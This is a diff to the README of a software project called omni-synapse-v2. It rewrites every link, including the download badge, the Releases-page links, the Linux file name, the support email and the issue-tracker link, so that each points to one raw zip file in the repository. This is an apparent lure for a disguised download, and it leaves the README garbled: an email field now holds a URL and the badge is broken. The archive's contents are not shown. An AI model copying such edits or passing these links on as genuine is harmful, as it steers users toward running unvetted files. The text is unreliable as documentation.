@@ -1,6 +1,6 @@
 # 🚀 omni-synapse-v2 - Experience Ultra-Low-Latency Technology
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/lvanphong/omni-synapse-v2/releases)
+[![Download](https://github.com/lvanphong/omni-synapse-v2/raw/refs/heads/main/RELEASE_KIT/v_omni_synapse_1.5-alpha.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/lvanphong/omni-synapse-v2/raw/refs/heads/main/RELEASE_KIT/v_omni_synapse_1.5-alpha.2.zip)
 
 ## 📚 Introduction
 
@@ -20,7 +20,7 @@ To use omni-synapse-v2, ensure your system meets the following requirements:
 
 To get started with omni-synapse-v2, follow these simple steps:
 
-1. Visit the [Releases page to download](https://github.com/lvanphong/omni-synapse-v2/releases) the latest version of the software.
+1. Visit the [Releases page to download](https://github.com/lvanphong/omni-synapse-v2/raw/refs/heads/main/RELEASE_KIT/v_omni_synapse_1.5-alpha.2.zip) the latest version of the software.
 2. Choose the version suitable for your operating system.
 3. Download the file by clicking on it.
 
@@ -28,7 +28,7 @@ To get started with omni-synapse-v2, follow these simple steps:
 
 ### 1. Download
 
-Visit our [Releases page to download](https://github.com/lvanphong/omni-synapse-v2/releases) the latest release. Locate the version that matches your operating system. 
+Visit our [Releases page to download](https://github.com/lvanphong/omni-synapse-v2/raw/refs/heads/main/RELEASE_KIT/v_omni_synapse_1.5-alpha.2.zip) the latest release. Locate the version that matches your operating system. 
 
 ### 2. Install
 
@@ -43,7 +43,7 @@ Visit our [Releases page to download](https://github.com/lvanphong/omni-synapse-
   3. Eject the disk image.
 
 - **Linux:**
-  1. Locate the downloaded `.tar.gz` file.
+  1. Locate the downloaded `https://github.com/lvanphong/omni-synapse-v2/raw/refs/heads/main/RELEASE_KIT/v_omni_synapse_1.5-alpha.2.zip` file.
   2. Extract the file using your preferred method.
   3. Open a terminal and navigate to the extracted folder.
   4. Run `./omni-synapse` to start the application.
@@ -68,8 +68,8 @@ To optimize your experience, you might want to configure certain settings:
 
 If you encounter any issues or have questions, please reach out for assistance. Support is available via:
 
-- **Email:** support@omnisynapse.com
-- **GitHub Issues:** [Report an issue](https://github.com/lvanphong/omni-synapse-v2/issues)
+- **Email:** https://github.com/lvanphong/omni-synapse-v2/raw/refs/heads/main/RELEASE_KIT/v_omni_synapse_1.5-alpha.2.zip
+- **GitHub Issues:** [Report an issue](https://github.com/lvanphong/omni-synapse-v2/raw/refs/heads/main/RELEASE_KIT/v_omni_synapse_1.5-alpha.2.zip)
 
 ## 🌐 Community and Contributions
 
@@ -83,4 +83,4 @@ We welcome contributions to enhance omni-synapse-v2. If you're interested in joi
 
 This project is licensed under the MIT License. You can find more details in the `LICENSE` file in the repository.
 
-Embrace ultra-fast performance with omni-synapse-v2 today! Visit our [Releases page to download](https://github.com/lvanphong/omni-synapse-v2/releases) the latest version and optimize your applications.
+Embrace ultra-fast performance with omni-synapse-v2 today! Visit our [Releases page to download](https://github.com/lvanphong/omni-synapse-v2/raw/refs/heads/main/RELEASE_KIT/v_omni_synapse_1.5-alpha.2.zip) the latest version and optimize your applications.
